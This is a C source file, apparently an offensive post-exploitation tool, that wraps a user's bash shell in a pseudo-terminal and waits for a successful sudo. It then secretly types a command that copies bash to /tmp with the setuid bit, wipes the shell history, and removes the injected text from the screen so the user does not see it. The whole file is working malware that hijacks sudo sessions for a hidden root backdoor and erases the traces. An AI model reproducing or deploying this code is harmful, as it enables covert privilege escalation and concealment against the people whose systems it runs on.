/*
 * Title:  script (extra, Linux)
 * Author: Shuichiro Endo
 */

//#define _DEBUG

#define _XOPEN_SOURCE 600

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <signal.h>
#include <termios.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/select.h>

#include "script.h"

#define BUFFER_SIZE 1024
#define INPUT_BUFFER_SIZE 10240
#define OUTPUT_BUFFER_SIZE 10240

struct termios termios;

static char *command = " 2>/dev/null;sudo cp -rp /bin/bash /tmp 2>/dev/null;sudo chmod +s /tmp/bash 2>/dev/null;echo -n > ~/.bash_history;history -c;\x0d";
static long sudo_timeout = 60 * 1000000; // 60s

static void fini(void)
{
    int ret = 0;
    pid_t ppid = -1;

    ret = tcsetattr(STDIN_FILENO, TCSANOW, &termios);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] [parent] tcsetattr error\n");
#endif
    }

    ppid = getppid();
    ret = kill(ppid, SIGHUP);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] [parent] kill error\n");
#endif
    }
}

int main(int argc, char* argv[])
{
    int master_fd = -1;
    int slave_fd = -1;
    pid_t child_pid = -1;
    pid_t pid = -1;
    struct termios t;
    struct winsize window_size;
    fd_set in_fds;
    ssize_t read_count = 0;
    ssize_t write_count = 0;
    ssize_t input_buffer_count = 0;
    ssize_t output_buffer_count = 0;
    int ret = 0;
    char buffer[BUFFER_SIZE] = {0};
    char input_buffer[INPUT_BUFFER_SIZE] = {0};
    char output_buffer[OUTPUT_BUFFER_SIZE] = {0};
    char *slave_name = NULL;
    char *shell;

    int sudo_flag = 0;
    int sudo_password_flag = 0;
    int sudo_success_flag = 0;
    int input_command_flag = 0;
    int done_command_flag = 0;
    int count = 0;

    ssize_t command_length = strlen(command);

    struct timeval start = { .tv_sec = 0, .tv_usec = 0 };
    struct timeval end = { .tv_sec = 0, .tv_usec = 0 };
    long sudo_time = 0;


    ret = tcgetattr(STDIN_FILENO, &termios);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] tcgetattr error\n");
#endif
        exit(0);
    }

    ret = ioctl(STDIN_FILENO, TIOCGWINSZ, &window_size);
    if(ret < 0){
#ifdef _DEBUG
        printf("[E] ioctl error\n");
#endif
        exit(0);
    }

    master_fd = posix_openpt(O_RDWR | O_NOCTTY);
    if(master_fd == -1){
#ifdef _DEBUG
        printf("[E] posix_openpt error\n");
#endif
        exit(0);
    }

    ret = grantpt(master_fd);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] grantpt error\n");
#endif
        close(master_fd);
        exit(0);
    }

    ret = unlockpt(master_fd);
    if(ret == -1){
#ifdef _DEBUG
        printf("[E] unlockpt error\n");
#endif
        close(master_fd);
        exit(0);
    }

    slave_name = ptsname(master_fd);
    if(slave_name == NULL){
#ifdef _DEBUG
        printf("[E] ptsname error\n");
#endif
        close(master_fd);
        exit(0);
    }


    child_pid = fork();
    if(child_pid == -1){
#ifdef _DEBUG
        printf("[E] fork error\n");
#endif
        close(master_fd);
        exit(0);
    }

    if(child_pid == 0){ // child
        ret = setsid();
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [child] setsid error\n");
#endif
            close(master_fd);
            exit(0);
        }

        close(master_fd);

        slave_fd = open((const char *)slave_name, O_RDWR);
        if(slave_fd == -1){
#ifdef _DEBUG
            printf("[E] [child] open error\n");
#endif
            exit(0);
        }

        ret = tcsetattr(slave_fd, TCSANOW, &termios);
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [child] tcsetattr error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        ret = ioctl(slave_fd, TIOCSWINSZ, &window_size);
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [child] ioctl error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        ret = dup2(slave_fd, STDIN_FILENO);
        if(ret != STDIN_FILENO){
#ifdef _DEBUG
            printf("[E] [child] dup2 error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        ret = dup2(slave_fd, STDOUT_FILENO);
        if(ret != STDOUT_FILENO){
#ifdef _DEBUG
            printf("[E] [child] dup2 error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        ret = dup2(slave_fd, STDERR_FILENO);
        if(ret != STDERR_FILENO){
#ifdef _DEBUG
            printf("[E] [child] dup2 error\n");
#endif
            close(slave_fd);
            exit(0);
        }

        if(slave_fd > STDERR_FILENO){
            close(slave_fd);
        }

        shell = "/bin/bash";

        execlp(shell, shell, (char *)NULL);

        exit(0);
    }else{  // parent
        pid = getpid();

        ret = tcgetattr(STDIN_FILENO, &t);
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [parent] tcgetattr error\n");
#endif
            close(master_fd);
            exit(0);
        }

        termios = t;

        t.c_iflag &= ~(IGNBRK | BRKINT | PARMRK | INPCK | ISTRIP | INLCR | IGNCR | ICRNL | IXON);
        t.c_oflag &= ~(OPOST);
        t.c_lflag &= ~(ISIG | ICANON | ECHO | IEXTEN);
        t.c_cc[VMIN] = 1;
        t.c_cc[VTIME] = 0;

        ret = tcsetattr(STDIN_FILENO, TCSAFLUSH, &t);
        if(ret == -1){
#ifdef _DEBUG
            printf("[E] [parent] tcsetattr error\n");
#endif
            close(master_fd);
            exit(0);
        }

        ret = atexit(fini);
        if(ret != 0){
#ifdef _DEBUG
            printf("[E] [parent] atexit error\n");
#endif
            close(master_fd);
            exit(0);
        }


        while(1){
            FD_ZERO(&in_fds);
            FD_SET(STDIN_FILENO, &in_fds);
            FD_SET(master_fd, &in_fds);

            ret = select(master_fd + 1, &in_fds, NULL, NULL, NULL);
            if(ret == -1){
#ifdef _DEBUG
                printf("[E] [parent] select error\n");
#endif
                close(master_fd);
                exit(0);
            }

            if(sudo_success_flag == 1){
                if(gettimeofday(&end, NULL) == -1){
#ifdef _DEBUG
                    printf("[E] [parent] gettimeofday error\n");
#endif
                    close(master_fd);
                    exit(0);
                }

                sudo_time = (end.tv_sec - start.tv_sec) * 1000000 + (end.tv_usec - start.tv_usec);  // microsecond
                if(sudo_time >= sudo_timeout){
                    sudo_flag = 0;
                    sudo_password_flag = 0;
                    sudo_success_flag = 0;

                    sudo_time = 0;
                    start.tv_sec = 0;
                    start.tv_usec = 0;
                    end.tv_sec = 0;
                    end.tv_usec = 0;
                }
            }

            if(FD_ISSET(STDIN_FILENO, &in_fds)){
                memset(buffer, 0, BUFFER_SIZE);
                read_count = read(STDIN_FILENO, buffer, BUFFER_SIZE);
                if(read_count <= 0){
#ifdef _DEBUG
                    printf("[E] [parent] read error\n");
#endif
                    close(master_fd);
                    exit(0);
                }

                if(input_buffer_count + read_count < INPUT_BUFFER_SIZE){
                    memcpy(input_buffer + input_buffer_count, buffer, read_count);
                    input_buffer_count += read_count;
                }else{
                    memset(input_buffer, 0, INPUT_BUFFER_SIZE);
                    input_buffer_count = 0;
                }

                if(input_buffer_count > 0 && (input_buffer[input_buffer_count - 1] == 0x03 || input_buffer[input_buffer_count - 1] == 0x0d)){
                    if(strstr(input_buffer, "sudo ") != NULL){
                        sudo_flag = 1;
                    }

                    if(sudo_success_flag == 1 && input_command_flag == 0 && (input_buffer_count != 1 && input_buffer[0] != 0x03 && input_buffer[0] != 0x0d)){
                        memset(input_buffer, 0, INPUT_BUFFER_SIZE);
                        input_buffer_count = 0;

                        memcpy(input_buffer, command, command_length);
                        input_buffer_count += command_length;

                        write_count = write(master_fd, input_buffer, input_buffer_count);
                        if(write_count != input_buffer_count){
#ifdef _DEBUG
                            printf("[E] [parent] write error\n");
#endif
                            close(master_fd);
                            exit(0);
                        }

                        sudo_flag = 0;
                        sudo_password_flag = 0;
                        sudo_success_flag = 0;
                        input_command_flag = 1;

                        memset(output_buffer, 0, OUTPUT_BUFFER_SIZE);
                        output_buffer_count = 0;
                    }else{
                        write_count = write(master_fd, buffer, read_count);
                        if(write_count != read_count){
#ifdef _DEBUG
                            printf("[E] [parent] write error\n");
#endif
                            close(master_fd);
                            exit(0);
                        }
                    }

                    memset(input_buffer, 0, INPUT_BUFFER_SIZE);
                    input_buffer_count = 0;
                }else{
                    write_count = write(master_fd, buffer, read_count);
                    if(write_count != read_count){
#ifdef _DEBUG
                        printf("[E] [parent] write error\n");
#endif
                        close(master_fd);
                        exit(0);
                    }
                }
            }

            if(FD_ISSET(master_fd, &in_fds)){
                memset(buffer, 0, BUFFER_SIZE);
                read_count = read(master_fd, buffer, BUFFER_SIZE);
                if(read_count <= 0){
#ifdef _DEBUG
                    printf("[E] [parent] read error\n");
#endif
                    close(master_fd);
                    exit(0);
                }

                if(output_buffer_count + read_count < OUTPUT_BUFFER_SIZE){
                    memcpy(output_buffer + output_buffer_count, buffer, read_count);
                    output_buffer_count += read_count;
                }else{
                    memset(output_buffer, 0, OUTPUT_BUFFER_SIZE);
                    output_buffer_count = 0;
                }

                if(input_command_flag == 1){    // remove echo command string
                    char *pos = strstr(output_buffer, command);
                    if(pos != NULL){
                        long len = output_buffer_count - (long)(pos - output_buffer) - command_length;

                        memmove(pos, pos + command_length, len);
                        output_buffer_count -= command_length;
                        output_buffer_count += 1;
                        output_buffer[output_buffer_count - 1] = 0x0d;

                        write_count = write(STDOUT_FILENO, output_buffer, output_buffer_count);
                        if(write_count != output_buffer_count){
#ifdef _DEBUG
                            printf("[E] [parent] write error\n");
#endif
                            close(master_fd);
                            exit(0);
                        }

                        input_command_flag = 0;
                        done_command_flag = 1;
                        memset(output_buffer, 0, OUTPUT_BUFFER_SIZE);
                        output_buffer_count = 0;
                    }
                }else if(done_command_flag == 1){   // remove ^@ string
                    char *pos = strstr(output_buffer, "\x5e\x40");
                    if(pos != NULL){
                        long len = output_buffer_count - (long)(pos - output_buffer) - 2;

                        memmove(pos, pos + 2, len);
                        output_buffer_count -= 2;

                        write_count = write(STDOUT_FILENO, output_buffer, output_buffer_count);
                        if(write_count != output_buffer_count){
#ifdef _DEBUG
                            printf("[E] [parent] write error\n");
#endif
                            close(master_fd);
                            exit(0);
                        }

                        done_command_flag = 0;
                        memset(output_buffer, 0, OUTPUT_BUFFER_SIZE);
                        output_buffer_count = 0;
                    }else{
                        if(count < 3){
                            count++;
                        }else{
                            write_count = write(STDOUT_FILENO, output_buffer, output_buffer_count);
                            if(write_count != output_buffer_count){
#ifdef _DEBUG
                                printf("[E] [parent] write error\n");
#endif
                                close(master_fd);
                                exit(0);
                            }

                            done_command_flag = 0;
                            count = 0;
                            memset(output_buffer, 0, OUTPUT_BUFFER_SIZE);
                            output_buffer_count = 0;
                        }
                    }
                }else{
//                    if(sudo_flag == 1 && output_buffer_count > 0 && output_buffer[output_buffer_count - 2] == 0x3a && output_buffer[output_buffer_count - 1] == 0x20 && strncmp(output_buffer, "[sudo] ", 7) == 0){   // start password input
                    if(sudo_flag == 1 && output_buffer_count > 0 && strncmp(output_buffer, "[sudo] ", 7) == 0){   // start password input
                        sudo_password_flag = 1;
                    }

                    if(sudo_flag == 1 && sudo_password_flag == 1){
                        if(output_buffer_count > 0 && strncmp(output_buffer, "sudo: ", 6) == 0){    //  sudo command failed
#ifdef _DEBUG
                            printf("[I] [parent] sudo command failed\n");
#endif
                            sudo_flag = 0;
                            sudo_password_flag = 0;
                            sudo_success_flag = 0;
                        }else if(output_buffer_count > 1 && output_buffer[output_buffer_count - 2] == 0x24 && output_buffer[output_buffer_count - 1] == 0x20){  // sudo command succeeded
#ifdef _DEBUG
                            printf("[I] [parent] sudo command succeeded\n");
#endif

                            if(gettimeofday(&start, NULL) == -1){
#ifdef _DEBUG
                                printf("[E] [parent] gettimeofday error\n");
#endif
                                close(master_fd);
                                exit(0);
                            }

                            sudo_flag = 0;
                            sudo_password_flag = 0;
                            sudo_success_flag = 1;
                        }
                    }

                    write_count = write(STDOUT_FILENO, buffer, read_count);
                    if(write_count != read_count){
#ifdef _DEBUG
                        printf("[E] [parent] write error\n");
#endif
                        close(master_fd);
                        exit(0);
                    }

                    if((read_count > 0 && buffer[read_count - 1] == 0x0d) || (read_count > 0 && buffer[read_count - 1] == 0x0a) || (read_count > 1 && buffer[read_count - 2] == 0x0d &&  buffer[read_count - 1] == 0x0a)){
                        memset(output_buffer, 0, OUTPUT_BUFFER_SIZE);
                        output_buffer_count = 0;
                    }
                }
            }
        }
    }

    close(master_fd);

    return 0;
}

